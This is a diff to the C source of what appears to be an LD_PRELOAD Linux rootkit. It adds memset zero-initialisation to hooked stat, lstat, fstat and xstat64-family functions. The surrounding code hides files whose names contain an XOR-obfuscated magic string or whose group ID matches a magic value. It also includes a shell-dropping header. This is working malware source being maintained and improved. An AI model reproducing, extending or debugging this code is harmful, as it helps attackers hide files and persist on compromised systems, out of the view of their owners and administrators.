@@ -17,7 +17,6 @@
 #include <pwd.h> 
 #include <shadow.h> 
 #include "utils/clean.h"
-#include "utils/catflap.h"
 #include "utils/xor.c"
 #include "utils/drop_shell.h"
 #include "rkconst.h"
@@ -182,6 +181,7 @@ int stat(const char *path, struct stat *buf)
 	if (owned()) return old_stat(path, buf); 
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat filestat; 
+	memset(&filestat, 0x00, sizeof(filestat));
 	old_stat(path, &filestat);
 	if (strstr(path, magic) || (filestat.st_gid == MAGICGID))
 	{
@@ -202,6 +202,7 @@ int stat64(const char *path, struct stat64 *buf)
 	
 	char *magic = strdup(MAGIC); xor(magic);
 	struct stat64 filestat; 
+	memset(&filestat, 0x00, sizeof(filestat));
 	old_stat64(path, &filestat); 
 	if (owned()) return old_stat64(path, buf); 
 	if (strstr(path, magic) || (filestat.st_gid == MAGICGID))
@@ -251,6 +252,7 @@ int __lxstat(int ver, const char *path, struct stat *buf)
 	}
 	char *magic = strdup(MAGIC); xor(magic);
 	struct stat filestat; 
+	memset(&filestat, 0x00, sizeof(filestat));
 	old___lxstat(ver, path, &filestat); 
 	if (strstr(path, magic) || filestat.st_gid == MAGICGID)
 	{
@@ -275,6 +277,7 @@ int __fxstat(int ver, int fildes, struct stat *buf)
 	}
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat filestat; 
+	memset(&filestat, 0x00, sizeof(filestat));
 	old___fxstat(ver, fildes, &filestat); 
 	if (filestat.st_gid == MAGICGID)
 	{ 
@@ -293,6 +296,7 @@ int lstat(const char *pathname, struct stat *buf)
 	printf("[!] lstat hooked"); 
 	#endif
 	struct stat filestat; 
+	memset(&filestat, 0x00, sizeof(filestat));
 	if (owned()) return old_lstat(pathname, buf); 
 	char *magic = strdup(MAGIC); xor(magic);
 	old_lstat(pathname, &filestat); 
@@ -312,7 +316,8 @@ int fstat(int fildes, struct stat *buf)
 	#ifdef DEBUG 
 	printf("[!] fstat hooked\n"); 
 	#endif
-	struct stat filestat; 
+	struct stat filestat;
+        memset(&filestat, 0x00, sizeof(filestat));	
 	if (owned()) return old_fstat(fildes, buf); 
 	old_fstat(fildes, &filestat);	
 	if (filestat.st_gid == MAGICGID)
@@ -330,6 +335,7 @@ int fstatat(int fd, const char *restrict path, struct stat *restrict buf, int fl
 	printf("[!] fstatat hooked\n"); 
 	#endif 
 	struct stat filestat; 
+	memset(&filestat, 0x00, sizeof(filestat));
 	if (owned()) return old_fstatat(fd, path, buf, flag); 
 	old_fstatat(fd, path, &filestat, flag); 
 	if (filestat.st_gid == MAGICGID)
@@ -350,6 +356,7 @@ int __xstat64(int ver, const char *path, struct stat64 *buf)
 	if (owned()) return old___xstat64(ver, path, buf); 
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat64 filestat; 
+	memset(&filestat, 0x00, sizeof(filestat));
 	old___xstat64(_STAT_VER, path, &filestat); 
 	if ((strstr(path, magic)) || (filestat.st_gid == MAGICGID))
 	{ 
@@ -371,6 +378,7 @@ int __lxstat64(int ver, const char *path, struct stat64 *buf)
 	if (owned()) return old___lxstat64(ver, path, buf); 
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat64 filestat; 
+	memset(&filestat, 0x00, sizeof(filestat));
 	old___lxstat64(_STAT_VER, path, &filestat); 
 	if ((strstr(path, magic)) || (filestat.st_gid == MAGICGID))
 	{ 
